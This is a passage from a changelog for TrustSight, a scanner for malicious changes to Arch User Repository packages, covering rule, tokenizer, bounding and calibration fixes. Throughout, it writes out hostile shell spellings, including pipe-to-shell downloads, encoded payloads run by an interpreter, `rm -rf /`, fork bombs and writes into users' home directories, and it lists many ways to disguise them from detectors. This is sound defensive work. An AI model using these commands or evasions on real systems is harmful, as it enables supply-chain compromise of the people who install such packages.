  scored 20 (the source-domain prior alone) and now scores 65.

  There were **two joiners** - `join_line_continuations` and the indexed form
  the rule path uses - and fixing the first left the second reachable, which
  is the "control applied at one of several equivalent call sites" failure
  `contributing/security-review.md` catalogues. Both now join verbatim, and
  indentation on the continuation line still separates arguments.

- **Two more shapes for X002**, found by wrapping one payload sixteen ways:
  brace expansion assembling a name (`cur{l,}`) and a character that
  impersonates ASCII (`сurl`, Cyrillic). Both scored 20 before and score 60
  now.

  The homoglyph shape uses the curated confusable map `buckets` already
  applies to domains, not "any non-ASCII character": the broader form raised
  X002's benign rate from 0.695% to 0.802% by firing on ordinary English prose
  carrying a typographic apostrophe, which impersonates nothing. Narrowing it
  returned the rate to 0.695% with the detection kept.

- **Esoteric-input sweep.** Thirty-seven shapes - heredocs (quoted, unquoted,
  dash), here-strings, process substitution, brace ranges, parameter
  operators, array slices, `case`, CRLF, missing trailing newline, NUL bytes,
  BOM, astral planes, combining marks, NFD, lone-surrogate escapes, malformed
  and negative hunk headers - produced **zero crashes and zero
  nondeterminism**. Sixteen carrying a live payload are now pinned as
  regressions: none may score on the source prior alone.

- **B2's calibration table was stale in six of eight figures.** Verified by
  recomputing every one against the locked corpus with the same code path the
  calibration gate uses: corpus size 3,246 -> 3,739, benign p95 45 -> 35,
  zero-rate 69.1% -> 68.3%, benign above threshold 16.3% -> 13.1%, the
  percentile 20 sits at 83.7th -> 86.9th, and the separation margin 15 -> 25.
  Median (0), malicious p5 (60) and malicious minimum (40) were correct.

  Every drift is in the safe direction - the tool flags fewer benign updates
  than documented and separates the populations more widely - but the doc's
  own promise is that a published number is measured, so "better than stated"
  is still stated wrongly. The prose said a reviewer should expect to look at
  roughly one benign update in six; it is now closer to one in eight.

- **The coverage-gap count said seven where eight are listed.** An off-by-one
  introduced with `deps_not_scanned`; the table itself was complete.

- **The diff generator's byte cap was inert on the path that uses it.** The git
  path called `generate_diff` with no `max_bytes`, so the internal capping
  block was skipped entirely: every filtered patch was materialised in full via
  `patch.text`, joined into one string, and only then truncated to 5 MiB. A
  repository with one 2 GB `.install` diff allocated 2 GB before any bound
  applied. `MAX_GENERATED_DIFF_BYTES` existed and did nothing on that path, and
  A4's own wording hedged it - "capped ... *when the git path requests a
  limit*", which it did not.

  The bound that matters now runs *before* `patch.text`. That attribute has
  already allocated the whole patch by the time it returns, so a cap applied
  afterwards bounds retention rather than memory - the same distinction this
  release draws for tar members and blobs, and one the first version of this
  fix got wrong. A delta whose declared file size on either side exceeds
  `MAX_PATCH_SOURCE_BYTES` is now skipped without its text being requested,
  which is the only bound available ahead of the allocation; a patch is at
  most the changed lines plus context, so a file small on both sides cannot
  yield a large one. Text that is read is capped at `MAX_PATCH_BYTES`, the
  retained total at `MAX_GENERATED_DIFF_BYTES`, patches visited at
  `MAX_DIFF_PATCHES`, and the summary at `MAX_DIFF_SUMMARY_FILES` - the
  summary walked every delta regardless of the text cap, so a wide repository
  chose the size of a stored `fact_json`.

  What none of this covers is libgit2's own diff construction: `repo.diff()`
  builds the diff before any of it runs, and that cost is a property of the
  repository. It sits inside the stated dependency assumption and is now
  documented rather than implied.

- **Generator-side truncation is returned, not inferred.** This is the pairing
  that matters, and fixing the bound without it would have created the defect
  it prevents: a patch the generator declines to retain leaves the assembled
  text at or under the cap, so a caller measuring that text reports a complete
  analysis while content was skipped. That is the silent skip B2 forbids and
  Part D lists as in scope. `generate_diff_bounded` returns the flag and the
  pipeline consumes it; the two-value `generate_diff` remains for existing
  callers.

  Policy omission stays distinct from truncation: a `.png` the filter never
  reads leaves nothing unexamined, while a `.install` dropped at a cap does,
  and only the second sets the flag.

- **The PKGBUILD blob driving companion discovery was read unbounded.**
  `blob.data` materialises everything, and the size check came afterwards - so
  the one blob guaranteed to exist was the one read without a bound, while the
  companion blobs beside it were checked first. Now bounded by
  `MAX_PKG_BUILD_BYTES` before `.data` is touched, with a test that proves the
  ordering behaviourally rather than by reading the source.

- **Companion discovery walked the whole tree.** `MAX_COMPANION_FILES` applies
  to the *selected* set, so the walk producing that set was unbounded; it now
  stops at `MAX_COMPANION_TREE_ENTRIES`. A referenced basename past
  `MAX_COMPANION_NAME_BYTES`, or carrying any path structure (absolute,
  traversal, separators, NUL), is refused rather than rendered into a hunk
  header naming a file the reader cannot open.

- Two new gates: `generated diff is bounded before assembly` and
  `companion reads are bounded before data`.

- **A snapshot member was read with no bound.** `MAX_RESPONSE_BYTES` caps the
  *compressed* snapshot body at 32 MiB, and `_pkgbuild_from_tarfile` then read
  the PKGBUILD member with a bare `read()`. A tar member's declared size is
  the attacker's number, and gzip on compressible content runs to roughly a
  thousand to one, so a tarball comfortably inside the response cap could
  declare - and cause the process to allocate - tens of gigabytes. Member
  reads are now bounded by `full_aur.fetch.MAX_TAR_MEMBER_BYTES` as the bytes
  are materialised.

- **Artifact reads happened before the checks that were supposed to bound
  them.** An Ed25519 signature is computed over the bytes of the thing it
  signs, so verification cannot run until those bytes are read: a bound
  behind the check guards nothing. The same applied to a digest recorded for
  attribution (A12) and to `gunzip_capped`, which capped an expansion it only
  ever saw as an already-materialised buffer. `ioc_baseline`, `full_aur.export`,
  `db` and `seed_build` now bound every such read before it happens.

- **New `trustsight.bounded_io`.** `read_capped` and `read_file_capped`, both
  refusing rather than truncating. A truncated read is a complete-looking one
  with its tail quietly removed, which is the seam A5 and A6 already refuse.

- **A refused snapshot is a coverage gap, not a silent fallback.** A refused
  archive and a package with no snapshot both fall back to the cgit text
  fetch, so on the fallback alone they are indistinguishable. The new
  `snapshot_refused` gap records that a bound in this program dropped
  content, travelling alongside `tree_not_analyzed`, which only says the tree
  was not read. A14 requires a bound that drops content to be visible as a
  bound.

- **Two new gates, both structural.** `every stream read is bounded` scans the
  whole source for a zero-argument `read()`; it caught a site
  (`seed_build._read_raw_maintainers`) that a targeted audit had missed, which
  is the case for scoping wide. `artifact reads are bounded before
  verification` enumerates the artifact-loading modules.

- **`no path-based archive extraction`**, renamed from `archives are never
  extracted to disk`. The old name was broader than both the check and the
  truth: `db._extract_v2_archive` does write seed members to disk, under an
  explicit containment guard. A8 now states that plainly, names the guards,
  and points at A12 as the actual trust anchor, instead of implying an
  extraction surface that does not exist.

### Changed

- **The complete hardening pass is covered by 2,473 tests, 65 security gates, and 10 calibration gates.** The standalone calibration runner now loads the repository source tree explicitly, so it cannot accidentally validate an older installed TrustSight package instead of the checkout under review.

- **Documentation moved to `docs.trustsight.org`.** 32 links across `README.md`
  and the site configuration (`site_url`, `canonical_host`, `public_base_url`,
  and the Open Graph image) now point at the new domain.

- **Performance: a large diff scans 31% faster, and CLI startup drops ~180 ms.**
  Profiled rather than guessed at, and every change is behaviour-preserving.

    - `deps._strip_comment` was called about **thirty times per diff line** -
      each rule module stripped comments independently - and is a pure
      function of a short string. Memoised with a bounded cache, because the
      keys are attacker-controlled and an unbounded memo is memory the
      attacker sizes.
    - Three modules (`buildfetch`, `sabotage`, `crossfire`) each carried their
      own char-by-char copy of the same stripper, which accounted for most of
      1.77 million list appends in one scan. All three now use the shared
      memoised one.
    - `registry_resolutions` ran **three times per analysis** - once for the
      coverage gap, once for the IOC surface, once for the R143 composition -
      re-joining every line and re-classifying every function each time. Now
      cached, also bounded.
    - `unicode.py` walked all **1,114,112 code points** at import asking
      `unicodedata` for each category, about 360 ms, paid by every CLI
      invocation including `--version`, because `cli.inspect` imports from it
      at module level. The scan is deferred to first use rather than replaced
      by a literal: deriving it is what makes a format-control codepoint added
      in a future Unicode version covered automatically, and only *when* it
      runs has changed.

  Measured on an 875 KB diff: 27.25s -> 18.81s. Scaling stays linear. Routine
  operations were swept and none exceeds 26 ms: config load 2.7 ms, rule load
  0.7 ms, fingerprint 2.5 ms, database init 15.2 ms, a typical package scan
  25.4 ms.

- **A CRITICAL finding floors the band at `High`.** CRITICAL weighs 40 and the
  High band opens at 51, so arithmetic alone could never lift a *single*
  CRITICAL above `Medium`: a lone fork bomb, a lone `rm -rf /` and a lone
  `curl | bash` all total 40, and `curl | bash` only read High because it
  happens to trip three rules at once. One confirmed CRITICAL finding is not a
  medium situation whatever the sum says.

  No score changes - the floor moves the band only - so the calibrated
  separation between the benign and malicious score populations is untouched
  (benign p95 35, malicious p5 60). Severity overriding arithmetic is the shape
  B4 already establishes, where a FATAL caps the score at 100 regardless of the
  total. Enforced by `a critical finding never reads medium`.

- **A FATAL finding names itself in `risk_label`.** A FATAL caps the score at
  100, so it arrives as `Critical` - and so does a score that merely
  accumulated past 80. Those are different claims: a FATAL rule is
  unsuppressible by construction and the shipped ones target the *reviewer*
  rather than the machine. `risk_label` now reads `Critical (FATAL: R013)`.

  It rides the label rather than a new band deliberately. `risk` is a closed
  enum consumers gate on, and nothing is lost without a new member: the
  severity is in `score_breakdown` either way. Naming the FATAL does not
  displace B2's coverage qualifier, which the gate asserts. Enforced by
  `a fatal finding names itself in the label`.

- **Three sabotage fixtures were mislabelled as whole attacks.** The
  separation gate excludes single-signal probes by reading their declared
  `min_score` against `CRITICAL_MIN_SCORE` (40), and `S001`-`S003` declared
  exactly 40 - asserting a High-or-worse outcome for fixtures that are
  one-rule probes scoring `Medium`. They were the first fixtures to land
  exactly on that boundary; every existing CRITICAL probe scores above it by
  tripping more than one rule. Relabelled to `min_score: 30`, which is still
  true and correctly classifies them, restoring malicious p5 from 50 to 60.

- **The API and the CLI now emit the same JSON body (B11).** There were three
  machine-readable surfaces building three different dicts: `review --json`
  (14 keys), `inspect --json` (14 different keys) and the API's `to_dict()`
  (31 keys), with two naming conventions between them (`package` against
  `package_name`, `score` against `final_score`). The API body carried no
  `findings` at all while its docstring claimed to be what the CLI writes, so
  a consumer written against one path could silently miss evidence on
  another. All three now render through `reporting.report_body`, and every key
  in `reporting.REPORT_KEYS` is present on all of them with the same value.

- **Three fields were missing from terminal renders that the JSON carried.**
  Found by pushing one fact through all seven output methods and comparing,
  rather than by comparing JSON with JSON. Each of the three had a gate
  already, and each gate was aimed at the layer where the value is set rather
  than at the renders that have to show it:

    - `trustsight inspect` reported **nothing** about a coverage gap unless
      `--score` or `--risk` was passed. The gap rode the band label, and the
      default output correctly withholds the band, so the one light that must
      never be suppressible was suppressed by default on that command (B2).
      Both `inspect` renders now show it independently of any band.
    - `trustsight review` showed **suppressed rules only in its JSON body** -
      neither the Rich nor the plain render mentioned them, so an
      override-silenced rule looked, on screen, exactly like one that never
      matched (B5).
    - `trustsight inspect` without Rich had **no change summary**, so that
      terminal could not tell "nothing fired and nothing changed" from
      "nothing fired and a great deal changed" (B7).

  Enforced by the new `every render reports the same information` gate, which
  loops over all four renderers.

- **`review`'s plain renderer is now `_render_results_plain`.** It was inline
  in `_run_analysis_loop` and could not be called without a CLI invocation,
  which is why two of the three omissions above lived there:
  `contributing/security-review.md` says an ungateable path is where the
  dropped field will be, and it was.

- **A fork-bomb pattern was bounded before it shipped.** Two unbounded lazy
  spans plus a backreference in `S001` is a catastrophic-backtracking shape,
  and A5's 8 KiB clamp still leaves 8 KiB to backtrack across: it cost 2.4
  seconds on one hostile line and failed the `rule matching is bounded on
  hostile input` gate. Every span in the sabotage module now carries a
  constant ceiling, which brought the same line to 20 ms and the whole
  family's cost to within noise of the pre-existing baseline.

- **`inspect --json` no longer volunteers the score.** It always emitted
  `score`, `risk` and `risk_label` regardless of the flags, so the number the
  CLI is documented to withhold was the default for every machine consumer of
  that command. The score group is now withheld on every surface unless asked
  for: `--score`/`--risk` on the CLI, `include_score=True` on the API.
  Per-finding `weight` moved to the verbose `score_breakdown`, since a weight
  is score arithmetic. Attribute access is unchanged - `report.score` is
  always populated, because naming the field is the request.

  **Breaking for consumers of `Report.to_dict()`**, which now returns the
  CLI's report body rather than the serialised `PackageFact`. The stored
  record is available as `Report.raw`, in its own storage naming.

- **`display._fact_to_dict` is gone.** It was `inspect --json`'s private body
  builder; with that path on the shared one it had no callers, and the
  `every JSON report carries the fingerprint` gate was still aimed at it -
  a gate passing against a function no JSON path calls, which is the same
  failure mode in a new place. The gate now exercises `report_body` (with and
  without the score) and the stored `fact_json` beside it.


- **CI installs from the lock.** Every workflow used `pip install -e ".[dev]"`,
  resolving five runtime dependencies fresh from PyPI on every push - a live
  remote dependency inside the job that certifies the security model, and the
  softest edge of the stated "CI is not compromised" assumption. Workflows now
  use `uv sync --locked`, which resolves nothing and installs exactly the
  pinned, hashed versions in `uv.lock`. Enforced by the new `CI installs from
  the lock` gate. `astral-sh/setup-uv` is pinned by commit SHA like every
  other action.

  The flag is `--locked` and not `--frozen` deliberately. Both install from
  the lock and resolve nothing, but `--frozen` performs no check that the
  lock still matches `pyproject.toml`: a dependency added to the manifest and
  never locked is silently ignored, and the job installs an older closure
  while appearing to honour the manifest. `--locked` fails instead, which is
  what makes the lock load-bearing rather than merely present.

- **`uv.lock` was stale.** It recorded the project at 0.11.0, two releases
  behind, so nothing could have installed `--frozen` from it. Refreshed; the
  dependency set was already correct and did not change.

- **`cryptography` now has a floor (`>=42.0`).** It had no lower bound at all,
  despite being the module that verifies the signatures A13 and A13b rest on.

### Added

- **A `supply-chain` workflow**: exports the locked closure, generates a
  CycloneDX SBOM, and reports known advisories against it, weekly and on
  dependency changes. Deliberately **non-blocking**. Making it a gate would
  put a remote advisory feed in the path of every push, which is what every
  other workflow's `--frozen` install exists to remove, and an advisory is
  evidence about a library rather than a verdict about this program. The
  "dependencies are trusted" assumption stands; what changes is that the
  project can now see when it stops holding.

- **[Sandboxing the tokenizer](explanation/sandboxing-the-tokenizer.md)**, a
  design note on the larger of the two architectural limits. It argues the
  tokenizer is the component worth isolating and the renderer is not, states
  what isolation would *not* buy (it bounds the blast radius of a defect, not
  the correctness of expansion), and records three conditions under which it
  should be built. Nothing is scheduled; the point is that the current
  position is a choice with its reasoning written down.

### Added

- **`trustsight review --deps` reviews the dependencies instead of the
  packages.** An AUR package's `depends` are built by the same `makepkg` run
  on the same machine, and the June 2026 campaign is the argument for looking
  at them: it hijacked orphans, and an orphan is far more often somebody's
  dependency than the thing they meant to install. A default review already
  analyses direct dependencies, but reports each as a *summary card* under the
  package that pulled it in; this makes each one the subject of its own panel,
  with its findings, its diff and its verdict.

  Each dependency reports **Required by**: the packages in the reviewed set
  that declare it. That is the reverse of the relationship the rest of the
  report describes, and it needed its own walk. `walk_dependencies` shares its
  `already_seen` across roots so a dependency twenty packages need is analysed
  once - right for a per-package report, and wrong here, because it attributes
  the dependency to whichever root reached it first. `dependency_closure` keeps
  every edge and analyses each package once.

  `--depth` applies to the closure: `--deps --depth 2` reviews direct
  dependencies *and theirs*, rather than walking two levels below each. Roots
  are not reviewed - that is the no-flag view. The same `MAX_DEPTH_LEVELS` and
  `MAX_DEPTH_NODES` ceilings bound the walk, because the graph is written by
  the party under review, and a closure cut short says so.

  `required_by` is in the JSON body and on `Report` too, and
  `TrustSight.review(deps=True)` is the API's spelling of the flag - a field
  the API can carry but never populate is a field that does nothing, and the
  closure walk lives in the engine so both surfaces reach the same one. An
  ordinary review now ends with a one-line pointer at the flag, shown only when
  something reported a dependency: advice about an empty set is noise, and so
  is advice you already followed.

- **Documentation caught up with the terminal.** The quickstart still showed a
  three-column `Package / Risk Score / Verdict` table that the tool has not
  rendered in a long time - and showed a score column by default, which is the
  opposite of what it does. The `inspect` sample printed `Status` twice and
  described the plain renderer as "a condensed subset", both of which were true
  before this release and are not now. The README's 30-second example carried
  the doubled rule id and `checksums checksum added or changed` verbatim, which
  is where the report of those defects came from. Every sample in the docs is
  now generated from the renderers rather than written by hand.

### Changed

- **Crossfire asks which *file* a line is in, not which function.** The scope
  gate was an allowlist of the five standard makepkg function names, and the
  function a payload sits in is chosen by the person being reviewed. Four
  spellings walked past all seven rules:

    - `package_libfoo()` - a **split package**. makepkg calls
      `package_$pkgname()` for each name in a split recipe, so renaming
      `package` was a one-word bypass. It is the commonest function shape in
      the AUR after the standard five.
    - `package_google-chrome-bin()` - worse: a pkgname may hold a hyphen and
      the shared classifier's `\w+` does not match one, so the header matched
      *neither* function expression. The body classified as `other`, invisible
      to every rule with a scope, not just this family. Fixed in `rules.py`
      with makepkg's own name class.
    - `_helper()`, called from `build()`.
    - a payload at **top level**, which runs when makepkg *sources* the
      recipe, before any build step - something the project already documents
      under `unresolved_parse_time` and the rules were not reading.

  A `PKGBUILD`, a `.install` scriptlet and a shell companion are shell from
  the first line to the last, top level included; a `.desktop`, a `.patch` and
  a `.SRCINFO` are not shell in any scope, which is a sharper exclusion than
  the old gate managed even when it worked.

  Widening it exposed four parser gaps the narrow gate had been hiding, each a
  line whose command position lives elsewhere: a multi-line array literal
  (`depends=(` then one entry per line), a multi-line `[[ ]]` test, a
  multi-line double-quoted string, and `[[ -n "$a" && "$a" != "$b" ]]` being
  split on its `&&` - a conditional that mentions a variable is most of the
  shell ever written. Plus one that was never about position: `command -v
  "$cmd"` asks where `$cmd` is and runs nothing.

  The family still fires on **zero** of the 3,246-diff benign corpus.

- **The crossfire family fires on zero of the 3,246-diff benign corpus, down
  from X002's 0.678%, while eleven more evasions are closed - ten here and one
  in the tokenizer.** Rate and recall
  moved in opposite directions, which is the only combination worth having, and
  it happened because none of the false positives were arguments about what
  counts as evasion. Every one was a rule looking in the wrong place.

    - **Function scope leaked across file boundaries.** A hunk shows part of a
      file, so a `package() {` whose closing brace fell outside it left the
      brace counter raised for the rest of the diff, placing every *following
      file* inside that function. A `.desktop` file's translated `Name[be]=`
      line was read as shell and matched X002's homoglyph shape - Cyrillic in a
      translation impersonates nothing and names no command. Fixed in the
      shared classifier in `rules.py`, so every scoped rule gets the
      correction, not just this family.
    - **A modified continuation tail lost its head.** The joiner joins lines
      carrying the same diff marker, so editing the tail of a `\`-continued
      command separates the halves with the removed version. The `+` line
      arrived alone and its first word - an argument to a command two lines up
      - read as a command name.
    - **`eval` was scored twice.** R039 already claims
      eval-of-dynamic-content; treating `eval` as a wrapper walked into its
      argument and drew a second CRITICAL on the same bytes. That is the thing
      this family says it never does, and the reason there is no X008 beside
      R013.
    - **A variable naming a directory is not a hidden command.**
      `"$srcdir/calibre-release/calibre-debug"` spells its executable out. The
      shape matched it because the variable name was allowed to match a
      *prefix* of itself, so `${pkgdir}/etc/x` read as `${pkgdi}` + `r`. Now
      the name is maximal, and a `/` after it means a path while an operator
      inside the braces (`${c//X/}`) still means assembly.
    - **`CMD=$(which x)` names its executable literally**, one line up, where
      every payload rule reads it. Exempted as the discovery idiom rather than
      as assignment in general: `CMD=$(printf '\x63\x75\x72\x6c')` assembles a
      name that appears nowhere and stays an evasion.

  The ten closed here: `if`/`elif`/`while`/`until` each take a command and test
  its exit status, and the scan stopped at the keyword - a one-word bypass of a
  CRITICAL rule. `set +o xtrace` is `set +x` spelled long. `base32 -d`,
  `openssl enc -d` and `uudecode` decode into the same shell as `base64 -d`
  without being it. And `cp payload /home/alice` writes into the same directory
  as `/home/alice/`, which every X005 alias pattern had required a trailing
  slash to see.

- **The tokenizer now removes an intra-word escape, and X002 stood down in the
  same change.** `c\url` is `curl` to the shell, which drops a backslash before
  an ordinary character. The tokenizer kept it, so the name never
  reconstructed and **no rule saw it at all** - not R001, not anything. It was
  the only bypass found in this pass that reached nothing.

  It was closed in crossfire first, as an `escaped-character` shape, and then
  closed properly in `tokenizer._ESCAPE_REMOVABLE`: every rule that reads a
  command name now sees through it, rather than one rule reporting the
  technique. The shape was retired with it, because a resolved name scored
  there too would be one command scored twice - the same reason `curl""`, which
  always folded, never had a shape. That progression is what this family's
  docstring asks for: it is not a substitute for fixing the tokenizer, and a
  shape retired because the tokenizer caught up is the arrangement working.

  Only the meaningless escapes are removed - a backslash before a letter,
  digit, `_`, `.` or `/`. `\|` is a **literal pipe, not a pipeline**, and
  unescaping it would have built a pipe-to-shell out of `curl x \| sh`, which
  runs nothing of the sort, and handed R001 a false positive. `\ ` holds one
  word together, `\$` is what stops an expansion, `\\` is a literal backslash,
  and an escape inside quotes is left alone so `printf '\x63\x75\x72\x6c'`
  still reaches the ANSI-C decoder. Bash removes every backslash; going that
  far here would not be more faithful, it would invent syntax the line did not
  have.

### Fixed

- **A negated character class was probed with the one character it excludes.**
  `_representatives` read `[^\s]` as if it were `[\s]` and derived `" "`;
  `[^0-9]` derived `"1"`. A pattern probed with input it cannot consume measures
  zero time, and zero is indistinguishable from fast, so **every pattern driven
  by a negated class was scored safe without ever being measured** - the same
  failure that let a quadratic `/+$` ship, surviving in a second form. The
  representative is now asked of the compiled class instead of inferred from its
  text, which answers positive and negated classes by the same mechanism.

- **The tokenizer folds case conversion and array slices.** `${c,,}` on
  `c=CURL` is `curl`; `${a[@]:0:1}` on `a=(curl x)` is `curl`. Neither resolved,
  so the payload rules saw the expansion rather than the command and X002
  reported the *technique* instead - which is the crossfire family's job only
  for as long as the tokenizer cannot do it. Both now reach R001 directly, as
  the escape fix did before them. `${c//X/}` already resolved and needed
  nothing.

- **The line-splitting fix had missed four modules, including the whole
  crossfire family.** The first sweep replaced `name.splitlines()` and could
  not see `clamp_text(diff_text).splitlines()` - a call on a call. So
  `sabotage`, `crossfire`, `adoption` and `buildfetch` kept Python's line
  semantics, and a payload split by `\v` or `U+2028` stayed invisible to the
  sabotage family, every crossfire rule and the orphan-adoption rules. Also
  missed: `analysis/pipeline.py`, where `difflib.unified_diff` **generates**
  the diff from PKGBUILD text, so a `U+2028` in a recipe produced diff lines
  that did not correspond to the file every downstream rule then read.

  All of them go through `tokenizer.split_lines` now, and
  `test_no_matching_module_splits_lines_the_python_way` greps for the rest -
  the defect was that a grep was not general enough, so the fix is a grep that
  is. It found this one: X008 below could not fire on `U+2028` or NEL, and the
  reason was not X008.

- **Every `{0,N}` in a crossfire shape was a bypass for typing N+1
  characters.** Four of them: 40 inside a partial quote, 60 before a
  confusable, 60 inside a brace group, 200 between a decode and its pipe. So
  `c"u"rl` fired and `c"uuu…45…u"rl` did not, on length alone, and the same
  for a padded brace group, a long command word with the confusable late in
  it, and a decode separated from its pipe by 201 characters.

  The bounds existed for backtracking safety, so removing them needed the
  safety back by other means: **possessive quantifiers** (`*+`, Python 3.11+)
  where the class already excludes what follows - `[^\n|;&]*+` cannot swallow
  the `|` it is hunting, so it never backtracks - and a **lookahead** where
  the span must give ground, asserting the separator once instead of
  searching for it from every position.

  That second half was not optional. The naive removal made two shapes
  **quadratic**: 31ms on one clamped line for the brace group and 26ms for
  X001. A bound traded for a quadratic is no trade - `is_superlinear` refuses
  that shape at compile time, and it is the thing this project has spent its
  hardening budget removing. Both are linear now (0.01ms and 1.8ms), pinned
  by `test_an_unbounded_span_stays_linear`.

- **Seven spellings of the same instruction walked past X003 and X004.** Each
  missed for a reason that says nothing about intent:

    - `set +xv` - the pattern wanted the `x` last in the option cluster, so
      `set +vx` fired and `set +xv` did not, on letter order alone.
    - `TERM='dumb'` and `TERM="dumb"` - a quote sets exactly the same
      variable.
    - `exec 2>>/dev/null` and `exec &>/dev/null` - only the truncating
      redirect was listed, and appending detaches a stream as thoroughly.
    - `sh -ce` and `bash -cl` - the `c` may sit anywhere in the cluster, and
      requiring it last let both through. The cluster must still hold two
      letters, which is what keeps an ordinary `sh -c` out.
    - `ash -lc`, `mksh -lc` - X003 carried its own five-shell list while X001
      had just been widened to a dozen. It uses the same list now, minus the
      interpreters, because `python -lc` means nothing.

  Still zero on the locked benign corpus after all of it.

- **A false positive that was not there.** X002 is CRITICAL, so a name the
  tokenizer *can* resolve must never reach it - `export CMD=curl` then `$CMD`
  is an ordinary recipe, and a rule firing CRITICAL on it would be worse than
  the evasion it guards against. Checked across `export`, `declare`, `local`,
  `readonly` and `typeset`: all silent, all resolved. Pinned, because the next
  change to the variable table is what would break it.

- **X005's staging exemption was case-insensitive and applied to the whole
  line.** Both were ways out of a HIGH rule. `$PKGDIR` is not a makepkg
  variable - it expands to nothing - so
  `install -Dm644 x "$PKGDIR/../../home/alice/.bashrc"` wrote into a home
  directory while claiming to be packaging, bought for the price of a shift
  key. And because the exemption was tested against the whole body, a real
  `$pkgdir` anywhere on the line bought silence:
  `echo "$pkgdir" && cp payload /home/alice/.bashrc` reported nothing.

  The exemption is case-sensitive now and belongs to the **target**: what
  makes a write packaging is that the path being written is under a staging
  root, which is a property of one word rather than of the line. Genuine
  staged writes stay exempt.

- **A URL scheme is case-insensitive, and two crossfire shapes were not.**
  `HTTPS://1.2.3.4/p.tar.gz` walked past X006's raw-IP shape and
  `HTTP://0x7f000001/` past X003's encoded host, both for a shift key. The
  shortener shape sitting beside them was already case-insensitive, which is
  what makes this an accident rather than a decision.

- **X001's executor list failed the way lists fail.** It read
  `sh|bash|zsh|dash|ksh`. `ash`, `mksh`, `pdksh`, `yash`, `posh`,
  `busybox sh`, `busybox ash`, `env -S sh`, `env -i bash`, `command -p sh`,
  `source /dev/stdin` and `. /dev/stdin` each took the decoded payload and
  ran it while the rule said nothing - twelve spellings, one of which R001
  already knew about, which is the tell that this was an oversight and not a
  boundary.

  Interpreters are now included too: `printf '\x63...' | python3` decodes an
  encoding and executes it, which is X001's whole claim, and the escape blob
  is what makes it unambiguous - no recipe pipes a hex blob into an
  interpreter by accident. The rule is renamed from *Encoded Payload Decoded
  To A Shell* to *Encoded Payload Decoded And Executed* so the name says what
  it does. Still **zero** on the locked benign corpus after the widening.

- **X008, whitespace a shell does not split on.** bash splits words on space,
  tab and newline. Python's `\s` also matches NBSP, NNBSP, the ogham and
  ideographic spaces, NEL and the line and paragraph separators - so a line
  reading `make install` with a NBSP between the words **displays as a command
  and executes as one unknown word**. What the reviewer reads is not what the
  shell runs.

  R013 is FATAL and claims bidi overrides, zero-width characters and tag
  characters. It does not claim these, so nothing scored them and nothing
  reported them - and a payload rule that spells whitespace as `\s` fires
  *around* one: R001 reported "curl piped to bash" for a line that runs no
  curl, which describes the wrong thing rather than nothing.

  MEDIUM, not FATAL: the line fails closed - the command is simply not found -
  and the realistic benign cause is a command copy-pasted from a web page.
  Measured before weighted, as the family requires: **zero** hits on the locked
  benign corpus. One diff in 3,246 carries such a character at all, in the text
  of a font licence, which is not a shell file and never reaches the file gate.
  The family's documented reason for having no X008 was that R013 left it
  nothing to do; that is true of R013's codepoints and not of these, so the
  reasoning is corrected rather than quietly dropped.

- **A shared command-position prefix was quadratic in newlines.** `_CMD` -
  the "start of subject, or just after a separator" prefix that a dozen
  sabotage rules and two crossfire rules are built from - ended in `\s*`,
  which matches a newline. On a subject holding many of them the engine
  re-scanned a run of newlines from every position: 8,192 cost **2.4s** in
  `_SHRED_HOME_RE` and **5.8s** in `_HISTORY_WIPE_RE`.

  Nothing reaches it today: every caller matches one line at a time and a
  line holds no newline, so this was latent rather than live. It is still
  the shape [A14](security.md) exists to forbid, sitting in a prefix a
  dozen rules share, and it stayed invisible for as long as it did because
  the probe alphabet could not produce a newline - which is the argument for
  fixing an alphabet before trusting any timing taken with it. The prefix is
  horizontal-only now (2.4s -> 1ms, 5.8s -> 4.7ms) and matches the same text:
  a command word follows spaces or tabs on its own line, and the newline
  boundary is the lookbehind's job.

- **Four code-emitted rules fired on an escaped pipe.** The TOML audit only
  reads `rules.toml`, so the R001-R003/R045 fix never reached the rules
  defined in source: `build._REMOTE_XARGS_SHELL_RE`,
  `delivery._PIPE_TO_SHELL_RE`, `network._PIPE_TO_SHELL_RE` and crossfire's
  own `X001_RE` all matched the inert spelling. All four now require an
  unescaped pipe. The audit that found them reads every `re.compile` in the
  source - 232 patterns against the 31 in the TOML set.

- **A class of control escapes derived no probe alphabet.**
  `[\t\n\r\f\v]+` was timed against input it cannot consume, because the
  scan for literals saw `t`, `n`, `r` - the letters, not the controls they
  name. Single-letter escapes are decoded now, which is what surfaced the
  `_CMD` quadratic above.

- **Three more rules fired on an escaped pipe.** R001 was the loudest but not
  the only one: R002 (wget to shell), R003 (base64 decode into a pipe) and R045
  (binary encoding pipe) all matched the inert spelling too, because each
  describes a *pipeline* and none of them checked that the bar was operative.
  All four now require an unescaped pipe, all four superseded spellings are
  registered for `config sync-rules --update`, and the corpus replay is
  identical on both sides of the change: zero-rate 68.4%, flag rate 11.9%,
  benign p95 35, CRITICAL p5 60. A strict narrowing that costs no recall is
  what removing a false positive should look like.

- **A FATAL rule's cost had never actually been measured.** R013's class is
  `\u202A-\u202E` and friends, and every fixed probe in `regex_safety` is
  ASCII, so both its backtracking risk and its growth ratio were taken against
  input it cannot match - and a measurement with the wrong alphabet reports
  zero, which reads exactly like fast. When no ASCII candidate fits a class,
  the probe character now comes out of the class body itself. R013 measures
  against `U+202A` and `U+200B` now, and is genuinely cheap; the point is that
  the check says so on evidence rather than by accident.

- **The rule linter had the same load sensitivity as the audit.** It measures
  backtracking by running the pattern, so a clean ruleset linted as unlinted
  depending on what else was on the machine - `test_shipped_default_rules_are_clean`
  passed alone and failed inside the full suite. Same fix as the audit and the
  bounded-matching gate: re-measure and keep the minimum. A checker that fails
  for reasons unrelated to what it checks teaches operators to ignore it.

- **R001 fired on an escaped pipe.** `curl x \| sh` passes a literal bar to
  curl as an argument and starts no pipeline; the rule matched it anyway - a
  false positive on the highest-severity, highest-recall rule in the set. The
  pattern now requires the pipe to be unescaped, which is exactly why the
  tokenizer keeps `\|` intact. Verified against the full corpus replay: benign
  rates and labelled-fixture recall both unchanged. The superseded pattern is
  registered so `config sync-rules --update` repairs an existing install.

- **Three JSON body keys were unreachable on `Report`.** `required_by`,
  `ioc_matches` and `scan_truncated` were all in `to_dict()` and absent from the
  object, so a caller wanting an indicator hit had to serialise the report to
  read a field the report already held. All three are attributes now, and
  `test_every_json_body_key_is_reachable_on_the_report` closes the class rather
  than the three instances.

- **Two timing checks failed under load and passed alone.** The regex audit and
  the bounded-matching gate both compared a wall-clock measurement against a
  fixed budget, so contention alone could fail them. Both now re-measure and
  keep the minimum when a result looks over budget: contention inflates a timing
